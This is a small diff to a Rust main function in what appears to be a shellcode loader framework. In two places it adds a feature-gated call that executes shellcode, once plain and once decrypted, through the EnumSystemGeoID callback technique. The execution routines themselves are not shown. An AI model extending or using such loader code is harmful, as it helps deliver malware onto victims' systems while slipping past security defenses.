@@ -229,6 +229,9 @@ fn main() {
 
         #[cfg(feature = "ShellcodeExecuteSignalObjectAndWaitAPC")]
         execution::shellcode_execute_signalobjectandwaitapc(shellcode.clone());
+
+        #[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
+        execution::shellcode_execute_enumsystemgeoid(shellcode.clone());
     }
 
     // =======================================================================
@@ -357,6 +360,9 @@ fn main() {
 
             #[cfg(feature = "ShellcodeExecuteSignalObjectAndWaitAPC")]
             execution::shellcode_execute_signalobjectandwaitapc(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
+            execution::shellcode_execute_enumsystemgeoid(decrypted_shellcode.clone());
         }
     }
 }
